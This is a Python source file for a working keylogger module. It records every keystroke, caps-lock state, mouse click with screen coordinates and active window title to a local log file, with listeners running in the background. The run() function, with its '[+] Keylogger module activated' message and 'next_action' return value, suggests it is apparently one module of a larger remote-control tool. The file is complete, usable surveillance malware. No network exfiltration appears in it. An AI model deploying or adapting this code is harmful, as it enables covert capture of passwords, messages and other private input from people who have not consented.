###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

# If libraries are not installed by default, automatically download and install them
import os
from pynput import keyboard, mouse
from ewmh import EWMH

# try:
#     from pynput import keyboard, mouse
#     from ewmh import EWMH
# except ImportError:
#     import subprocess

#     subprocess.check_call(["pip", "install", "pynput"])
#     subprocess.check_call(["pip", "install", "ewmh"])

#     from pynput import keyboard, mouse
#     from ewmh import EWMH

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

class keylogger():
    def __init__(self):
        self.previous_active_window = None
        self.previous_action = None
        self.pressed_keys = set()
        # Assuming the user hasn't got the capital letters activated when the program starts
        self.cap_letters = False
        # Used to get the active window name
        self.ewmh = EWMH()

        # Erases all the file content
        self.keylog_txt_name = './media/keylog.txt'
        with open(self.keylog_txt_name, 'w'): pass
        
        # Starts the keyboard and mouse listeners
        self.keyboard_listener = keyboard.Listener(
            on_press=lambda key: self.on_key_press(key), 
            on_release=lambda key: self.on_key_release(key)
        )
        self.mouse_listener = mouse.Listener(
            on_click=lambda x, y, button, pressed: self.on_mouse_click(x, y, button, pressed),
            # on_scroll=lambda x, y, dx, dy: self.on_mouse_scroll(x, y, dx, dy),
            on_scroll=None
        )
        self.keyboard_listener.start()
        self.mouse_listener.start()

    # Returns the name of the current active window
    def get_active_window(self):
        try: current_active_window = self.ewmh.getWmName(self.ewmh.getActiveWindow())
        except: return
        if current_active_window == self.previous_active_window: return

        with open(self.keylog_txt_name, 'a') as file:
            if self.previous_action == 'Key': file.write('\n')
            file.write(f"\n########## {current_active_window} ##########\n")
        # if self.previous_action == 'Key': print()
        # print(f"\n########## {current_active_window} ##########")
        self.previous_action = 'Window'

        self.previous_active_window = current_active_window
        return current_active_window

###########################################################################################################################

    # Event raised whenever a key is pressed
    def on_key_press(self, key): 
        self.get_active_window()
        self.previous_action = 'Key'

        # Avoid repeated prints when key is pressed for a long time
        if key in self.pressed_keys: return
        self.pressed_keys.add(key)

        try: 
            if self.cap_letters:
                # Cap_letters + shift = lower_letters
                if keyboard.Key.shift in self.pressed_keys or keyboard.Key.shift_r in self.pressed_keys:
                    key.char = str(key.char).lower()
                else: key.char = str(key.char).upper()

            with open(self.keylog_txt_name, 'a') as file: file.write(f"{key.char}")
            # print(f"{key.char}", end='', flush=True)
        except AttributeError: 
            if key == keyboard.Key.caps_lock: self.cap_letters = not self.cap_letters

            if key == keyboard.Key.space: 
                with open(self.keylog_txt_name, 'a') as file: file.write(f" ")
                # print(" ", end='', flush=True)
            else: 
                with open(self.keylog_txt_name, 'a') as file: 
                    file.write(f' "{str(key).split(".")[-1].upper()}" ')
                # print(f' "{str(key).split(".")[-1].upper()}" ', end='', flush=True)

    # Event raised whenever a key is released
    def on_key_release(self, key):
        self.get_active_window()
        # Doesn't raise an error if the key is not found
        self.pressed_keys.discard(key)

        # Does nothing unless the key is a special char
        try: key.char
        except AttributeError: 
            if key == keyboard.Key.space: pass
            else: 
                with open(self.keylog_txt_name, 'a') as file: 
                    file.write(f' "{str(key).split(".")[-1].lower()}" ')
                # print(f' "{str(key).split(".")[-1].lower()}" ', end='', flush=True)
            self.previous_action = 'Key'

    # Event raised whenever a mouse button is pressed or released
    def on_mouse_click(self, x, y, button, pressed):
        self.get_active_window()
        # Do nothing if the button is being released
        if not pressed: return

        if self.previous_action == 'Key': 
            with open(self.keylog_txt_name, 'a') as file: file.write(f"\n")
            # print()
        with open(self.keylog_txt_name, 'a') as file: 
            file.write(f"Mouse {str(button).split('.')[-1].lower()} click {'pressed' if pressed else 'released'} at ({x}, {y})\n")
        # print(f"Mouse {str(button).split('.')[-1].lower()} click {'pressed' if pressed else 'released'} at ({x}, {y})")
        self.previous_action = 'Mouse'

    # Event raised whenever a scroll is detected
    def on_mouse_scroll(self, x, y, dx, dy): 
        self.get_active_window()

        with open(self.keylog_txt_name, 'a') as file: 
            file.write(f"Mouse scroll at ({x}, {y}) with scroll distance: ({dx}, {dy})")
        # print(f"Mouse scroll at ({x}, {y}) with scroll distance: ({dx}, {dy})")
        self.previous_action = 'Mouse'

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    # Starts the keylogger in the background
    keylogger()

    print("[+] Keylogger module activated...")

    return_data = "no_data"
    next_action = "instructions"
    return return_data, next_action

if __name__ == '__main__':
    from time import sleep

    keylogger = keylogger()
    
    # Keep the listeners running
    keylogger.keyboard_listener.join()
    keylogger.mouse_listener.join()